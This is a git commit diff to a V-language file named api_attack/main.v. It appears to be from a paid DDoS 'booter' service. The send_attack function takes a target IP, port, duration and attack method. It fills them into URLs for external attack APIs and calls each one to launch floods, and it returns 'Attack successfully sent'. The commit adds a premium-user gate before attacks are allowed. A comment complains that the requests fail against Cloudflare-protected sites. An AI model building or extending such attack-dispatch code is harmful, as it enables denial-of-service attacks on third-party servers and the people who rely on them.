bf0784547ff93f2e857fa9ac4f7c9b7809809656
n4n0 <benzothedev@gmail.com>
2021-07-30 07:16:16 -0400

    Update main.v

--- api_attack/main.v
+++ api_attack/main.v
@@ -11,26 +11,31 @@ pub fn (mut s API_Attack_Info) send_attack(usr string, ip string, port int, time
 	println("$usr, $ip, $port, $time, $method")
 	println('test')
 	mut api_c := api_attack.API_Crud{}
+	mut cf := auth.CrudFunc{user: usr}
 	mut attk_c := auth.AttackCrud{user: usr}
 	mut attk_f := auth.AttackFunc{user: usr}
-	if attk_f.attack_validation() {
-		if attk_f.validate_time() {
-			mut apis := api_c.apis_with_method(method) // this function return an array of APIs
-			// println(apis)
-			for api in apis { 
-				// this function 'fix_api()' takes the API and returns it replacing [host] [port] [time] [method] in API URL
-				// i might have to change this. This HTTP Web Request function sucks cawk with CLOUDFLARE protected sites
-				// might use C
-				mut f := http.get(s.fix_api(api, ip, port, time, method)) or { panic("Failed to send attack") }
-				println(f) // print response to make sure attack is going thru
+	if cf.is_premium() == true {
+		if attk_f.attack_validation() {
+			if attk_f.validate_time() {
+				mut apis := api_c.apis_with_method(method) // this function return an array of APIs
+				// println(apis)
+				for api in apis { 
+					// this function 'fix_api()' takes the API and returns it replacing [host] [port] [time] [method] in API URL
+					// i might have to change this. This HTTP Web Request function sucks cawk with CLOUDFLARE protected sites
+					// might use C
+					mut f := http.get(s.fix_api(api, ip, port, time, method)) or { panic("Failed to send attack") }
+					println(f) // print response to make sure attack is going thru
+				}
+				attk_c.user_conn_up() // up the user on-going attk
+				return "Attack successfully sent to ${ip}:${port} for ${time} with ${method}!\r\n"
+			} else {
+				return "[x] Error, The time you've enter for attack (${time}) is over you're max time. Try again with less the time\r\n"
 			}
-			// attk_c.user_conn_up() // up the user on-going attk
-			return "Attack successfully sent to ${ip}:${port} for ${time} with ${method}!\r\n"
 		} else {
-			return "[x] Error, The time you've enter for attack (${time}) is over you're max time. Try again with less the time\r\n"
+			return "You've reached the maximum concurrents. Please wait until an attack to finish!\r\n"
 		}
 	} else {
-		return "You've reached the maximum concurrents. Please wait until an attack to finish!\r\n"
+		return "You are not a premium user to use this command!\r\n"
 	}
 }
 
